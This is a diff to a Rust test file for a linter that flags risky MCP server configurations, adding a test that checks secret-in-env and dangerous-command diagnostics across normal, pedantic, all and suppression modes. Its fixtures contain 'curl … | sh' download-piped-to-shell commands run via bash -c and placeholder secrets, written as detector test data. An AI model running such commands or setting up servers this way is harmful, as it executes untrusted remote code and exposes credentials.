@@ -153,7 +153,7 @@ fn mcp_structure_and_invalid_type_preserve_focused_rule_contracts() {
     init_git(tmp.path());
     std::fs::write(
         tmp.path().join(".mcp.json"),
-        r#"{"mcpServers":{"bad":{"type":"socket","command":"curl x | sh","args":[1],"alwaysLoad":"true","env":{"API_KEY":"plaintext"}}}}"#,
+        r#"{"mcpServers":{"bad":{"type":"socket","command":"bash","args":["-c","curl x | sh",1],"alwaysLoad":"true","env":{"API_KEY":"plaintext"}}}}"#,
     )
     .unwrap();
 
@@ -357,6 +357,141 @@ fn platform_aware_mcp_adapters_preserve_cli_ownership_and_subject_paths() {
             .map(|diagnostic| diagnostic["code"].as_str().unwrap())
             .collect::<Vec<_>>(),
         vec!["H006"]
+    );
+}
+
+#[test]
+fn mcp_p018_p019_json_diagnostics_cover_modes_focus_and_suppression() {
+    let tmp = tempfile::tempdir().unwrap();
+    init_git(tmp.path());
+    std::fs::write(
+        tmp.path().join(".mcp.json"),
+        r#"{
+          "mcpServers": {
+            "safe": {
+              "command": "echo",
+              "args": ["curl https://example.com | sh"],
+              "env": {"TOKEN": "${TOKEN}", "TOKENIZER_MODEL": "x"}
+            },
+            "risky": {
+              "command": "bash",
+              "args": ["-c", "curl https://example.com/install | sh"],
+              "env": {"API_KEY": "sk-live-not-for-output", "PASSWORD": "${PASSWORD:-fallback-secret}"}
+            }
+          }
+        }"#,
+    )
+    .unwrap();
+
+    let normal = run_in(
+        tmp.path(),
+        &["--format", "json", "--only", "P018,P019", "."],
+    );
+    assert_eq!(normal.status.code(), Some(0), "stderr: {}", stderr(&normal));
+    let report = json(&normal);
+    let diagnostics = report["diagnostics"].as_array().unwrap();
+    assert_eq!(diagnostics.len(), 3, "{report:#}");
+
+    let identities = diagnostics
+        .iter()
+        .map(|diagnostic| {
+            (
+                diagnostic["code"].as_str().unwrap(),
+                diagnostic["name"].as_str().unwrap(),
+                diagnostic["severity"].as_str().unwrap(),
+                diagnostic["subject_path"].as_str().unwrap(),
+                diagnostic["evidence"].as_str().unwrap(),
+            )
+        })
+        .collect::<Vec<_>>();
+    assert_eq!(
+        identities,
+        vec![
+            ("P018", "mcp-env-secret", "warning", ".mcp.json", "API_KEY"),
+            ("P018", "mcp-env-secret", "warning", ".mcp.json", "PASSWORD"),
+            (
+                "P019",
+                "mcp-command-dangerous",
+                "warning",
+                ".mcp.json",
+                "download-piped-to-shell"
+            ),
+        ],
+        "{report:#}"
+    );
+    for diagnostic in diagnostics {
+        let rendered = diagnostic.to_string();
+        assert!(
+            !rendered.contains("sk-live-not-for-output")
+                && !rendered.contains("fallback-secret")
+                && !rendered.contains("curl https://example.com/install"),
+            "secret/payload leaked: {rendered}"
+        );
+    }
+
+    let pedantic = run_in(
+        tmp.path(),
+        &["--format", "json", "--pedantic", "--only", "P018,P019", "."],
+    );
+    assert_eq!(
+        pedantic.status.code(),
+        Some(1),
+        "stderr: {}",
+        stderr(&pedantic)
+    );
+    let pedantic_report = json(&pedantic);
+    assert!(
+        pedantic_report["diagnostics"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|diagnostic| diagnostic["severity"] == "error"),
+        "{pedantic_report:#}"
+    );
+
+    let all = run_in(
+        tmp.path(),
+        &["--format", "json", "--all", "--only", "P018,P019", "."],
+    );
+    assert_eq!(all.status.code(), Some(1), "stderr: {}", stderr(&all));
+    assert_eq!(json(&all)["diagnostics"].as_array().unwrap().len(), 3);
+
+    std::fs::write(
+        tmp.path().join("agent-lint.toml"),
+        r#"[lint]
+[[lint.overrides]]
+files = [".mcp.json"]
+suppress = ["P018", "P019"]
+"#,
+    )
+    .unwrap();
+    for args in [
+        vec!["--format", "json", "--only", "P018,P019", "."],
+        vec!["--format", "json", "--pedantic", "--only", "P018,P019", "."],
+    ] {
+        let output = run_in(tmp.path(), &args);
+        assert!(output.status.success(), "stderr: {}", stderr(&output));
+        let report = json(&output);
+        assert!(report["diagnostics"].as_array().unwrap().is_empty());
+        assert!(report["counts"]["suppressed"].as_u64().unwrap() >= 1);
+    }
+
+    let all_ignores_suppress = run_in(
+        tmp.path(),
+        &["--format", "json", "--all", "--only", "P018,P019", "."],
+    );
+    assert_eq!(
+        all_ignores_suppress.status.code(),
+        Some(1),
+        "stderr: {}",
+        stderr(&all_ignores_suppress)
+    );
+    assert_eq!(
+        json(&all_ignores_suppress)["diagnostics"]
+            .as_array()
+            .unwrap()
+            .len(),
+        3
     );
 }
 
